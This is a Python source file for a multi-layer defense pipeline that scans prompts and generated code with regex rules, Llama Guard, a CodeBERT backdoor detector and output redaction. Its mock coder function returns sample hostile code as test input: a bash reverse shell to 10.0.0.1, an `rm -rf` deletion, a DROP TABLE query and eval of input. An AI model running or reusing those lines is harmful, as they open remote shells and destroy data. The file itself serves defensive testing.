"""Quick runnable Sentinel-style defense pipeline."""

from __future__ import annotations

import hashlib
import io
import json
import re
import tokenize
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Iterable

from .config import (
    HARMFUL_PROMPT_HINTS,
    PATTERN_CONFIG,
)
from .codebert_backdoor import CodeBERTBackdoorGuard
from .llamaguard_client import LlamaGuardClient
from .models import LayerResult, PipelineResult


def _extract_python_comments_and_strings(text: str) -> str:
    parts: list[str] = []
    try:
        stream = io.StringIO(text)
        for tok in tokenize.generate_tokens(stream.readline):
            if tok.type in (tokenize.STRING, tokenize.COMMENT):
                parts.append(tok.string)
    except tokenize.TokenError:
        return text
    return "\n".join(parts) if parts else text


def _extract_js_comments_and_strings(text: str) -> str:
    comment_re = r"//.*?$|/\*.*?\*/"
    string_re = r"'(?:\\.|[^'])*'|\"(?:\\.|[^\"])*\"|`(?:\\.|[^`])*`"
    comments = re.findall(comment_re, text, flags=re.MULTILINE | re.DOTALL)
    strings = re.findall(string_re, text, flags=re.MULTILINE | re.DOTALL)
    extracted = comments + strings
    return "\n".join(extracted) if extracted else text


def _extract_natural_segments(text: str, is_code: bool) -> list[str]:
    if not is_code:
        return [text]
    parts = [
        _extract_python_comments_and_strings(text),
        _extract_js_comments_and_strings(text),
    ]
    extracted = [p.strip() for p in parts if p and p.strip()]
    if extracted:
        return extracted
    symbol_ratio = sum(ch in "{}();<>=/*`" for ch in text) / max(len(text), 1)
    return [text] if symbol_ratio < 0.05 else []


def _scan_pattern_group(name: str, text: str) -> tuple[str, dict]:
    cfg = PATTERN_CONFIG[name]
    matches: list[str] = []
    for pattern in cfg["patterns"]:
        if re.search(pattern, text, flags=re.IGNORECASE | re.DOTALL):
            matches.append(pattern)
    return name, {"matches": matches, "action": cfg["action"]}


def _layer1_codeguard(content: str, is_code: bool = False) -> LayerResult:
    scan_segments = _extract_natural_segments(content, is_code=is_code)
    scan_text = "\n".join(scan_segments) if scan_segments else content

    matches: dict[str, dict] = {}
    with ThreadPoolExecutor(max_workers=4) as pool:
        futures = [
            pool.submit(_scan_pattern_group, group_name, scan_text)
            for group_name in PATTERN_CONFIG
        ]
        for fut in futures:
            group_name, result = fut.result()
            matches[group_name] = result

    positive_groups = {k: v for k, v in matches.items() if v["matches"]}
    if not positive_groups:
        return LayerResult(
            layer="L1_CodeGuard",
            status="clean",
            action="allow",
            reason="No explicit risky patterns found.",
            details={"matches": {}},
        )

    action_rank = {"warn": 1, "require_review": 2, "block": 3}
    strongest_action = "warn"
    for group in positive_groups.values():
        if action_rank[group["action"]] > action_rank[strongest_action]:
            strongest_action = group["action"]

    status = "blocked" if strongest_action == "block" else "flagged"
    return LayerResult(
        layer="L1_CodeGuard",
        status=status,
        action=strongest_action,
        reason=f"Matched risky patterns in {', '.join(positive_groups.keys())}.",
        details={"matches": positive_groups},
    )

def _layer3_multi_agent_validator(layer_results: Iterable[LayerResult]) -> LayerResult:
    results = list(layer_results)
    blocked_count = sum(1 for r in results if r.status in {"blocked", "unsafe"})
    flagged_count = sum(1 for r in results if r.status == "flagged")
    semantic_categories = []
    for result in results:
        if result.layer == "Semantic_LlamaGuard":
            semantic_categories = result.details.get("categories", [])

    if blocked_count >= 2 or "S14" in semantic_categories:
        risk = "High"
        status = "blocked"
        action = "block"
        reason = "Multiple layers reported high-confidence threats."
    elif blocked_count == 1 or flagged_count >= 2:
        risk = "Medium"
        status = "flagged"
        action = "require_review"
        reason = "Cross-layer suspicious trajectory detected."
    else:
        risk = "Low"
        status = "clean"
        action = "allow"
        reason = "Cross-layer trajectory remains low-risk."

    return LayerResult(
        layer="L3_MultiAgentValidator",
        status=status,
        action=action,
        reason=reason,
        details={"risk_label": risk},
    )


def _safe_output(text: str) -> LayerResult:
    redacted = re.sub(r"\b(sk-[A-Za-z0-9]{20,})\b", "[REDACTED_TOKEN]", text)
    redacted = re.sub(
        r"\b(password\s*=\s*['\"].+?['\"])",
        "password='[REDACTED]'",
        redacted,
        flags=re.IGNORECASE,
    )
    changed = redacted != text
    return LayerResult(
        layer="L4_SafeOutput",
        status="clean",
        action="redact" if changed else "allow",
        reason="Applied redaction." if changed else "No redaction needed.",
        details={"redacted": changed, "output_preview": redacted[:220]},
    )


def _mock_coder_agent(prompt: str) -> str:
    lowered = prompt.lower()
    if any(k in lowered for k in HARMFUL_PROMPT_HINTS):
        return (
            "import os\n"
            "import subprocess\n\n"
            "def run(cmd):\n"
            "    return eval(cmd)\n\n"
            "os.system('rm -rf /tmp/demo_data')\n"
            "query = f\"DROP TABLE users WHERE id = {1}\"\n"
            "subprocess.Popen('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1', shell=True)\n"
        )
    return (
        "def summarize(numbers):\n"
        "    total = sum(numbers)\n"
        "    avg = total / len(numbers) if numbers else 0\n"
        "    return {'total': total, 'average': avg}\n"
    )


class SentinelPipeline:
    """Sentinel pipeline with real LlamaGuard + CodeBERT options."""

    def __init__(self) -> None:
        self.llamaguard_client = LlamaGuardClient()
        if not self.llamaguard_client.is_configured():
            raise RuntimeError(
                "Real Llama Guard is required but not configured. "
                "Set GROQ_API_KEY (and optionally GROQ_LLAMAGUARD_MODEL)."
            )
        try:
            self.codebert_guard = CodeBERTBackdoorGuard()
        except Exception as exc:
            raise RuntimeError(
                "Real CodeBERT detector is required but failed to initialize."
            ) from exc

    def _semantic_layer(self, prompt: str) -> LayerResult:
        resp = self.llamaguard_client.classify(prompt, direction="input")
        flagged = bool(resp.get("flagged", False))
        categories = resp.get("categories_codes", []) or []
        return LayerResult(
            layer="Semantic_LlamaGuard",
            status="unsafe" if flagged else "safe",
            action="block" if flagged else "allow",
            reason="Llama Guard verdict.",
            details={
                "categories": categories,
                "raw_text": resp.get("raw_text", ""),
                "source": "real_llamaguard",
            },
        )

    def _backdoor_layer(self, code: str) -> LayerResult:
        report = self.codebert_guard.check_code_safety(code)
        label = report["label"]
        status = "clean"
        action = "allow"
        if label == "SUSPICIOUS":
            status = "flagged"
            action = "require_review"
        elif label == "MALICIOUS":
            status = "blocked"
            action = "block"
        return LayerResult(
            layer="L2_BackdoorDetection",
            status=status,
            action=action,
            reason=f"Verdict: {label}",
            details={
                **report["details"],
                "score": report["score"],
                "source": "real_codebert",
            },
        )

    def run(
        self,
        prompt: str,
        generated_code: str | None = None,
        human_override: bool = False,
    ) -> PipelineResult:
        run_id = hashlib.sha1(prompt.encode("utf-8")).hexdigest()[:10]
        code = generated_code if generated_code is not None else _mock_coder_agent(prompt)

        results: list[LayerResult] = []
        blocked_layer: str | None = None

        l1_prompt = _layer1_codeguard(prompt, is_code=False)
        results.append(l1_prompt)
        if l1_prompt.action == "block" and not human_override:
            blocked_layer = l1_prompt.layer

        # Avoid unnecessary API pressure: if L1 already hard-blocked and no override,
        # skip Llama Guard call for this item.
        if blocked_layer is not None and not human_override:
            l_sem = LayerResult(
                layer="Semantic_LlamaGuard",
                status="skipped",
                action="allow",
                reason="Skipped because L1 already blocked prompt.",
                details={"source": "skipped_due_to_l1_block"},
            )
        else:
            l_sem = self._semantic_layer(prompt)
        results.append(l_sem)
        if blocked_layer is None and l_sem.action == "block" and not human_override:
            blocked_layer = l_sem.layer

        l1_code = _layer1_codeguard(code, is_code=True)
        l1_code.layer = "L1_CodeGuard_Code"
        results.append(l1_code)
        if blocked_layer is None and l1_code.action == "block" and not human_override:
            blocked_layer = l1_code.layer

        l2 = self._backdoor_layer(code)
        results.append(l2)
        if blocked_layer is None and l2.action == "block" and not human_override:
            blocked_layer = l2.layer

        l3 = _layer3_multi_agent_validator(results)
        results.append(l3)
        if blocked_layer is None and l3.action == "block" and not human_override:
            blocked_layer = l3.layer

        l4 = _safe_output(code)
        results.append(l4)
        safe_output = l4.details.get("output_preview", "")

        if blocked_layer:
            final_status = "BLOCKED"
            risk_label = l3.details.get("risk_label", "High")
        else:
            final_status = "COMPLETED"
            risk_label = l3.details.get("risk_label", "Low")

        return PipelineResult(
            run_id=run_id,
            prompt=prompt,
            generated_code=code,
            final_status=final_status,
            risk_label=risk_label,
            blocked_layer=blocked_layer,
            safe_output=safe_output,
            layers=results,
        )

    @staticmethod
    def save_result(result: PipelineResult, output_dir: str | Path) -> Path:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        file_path = output_path / f"{result.run_id}.json"
        file_path.write_text(json.dumps(result.to_dict(), indent=2), encoding="utf-8")
        return file_path
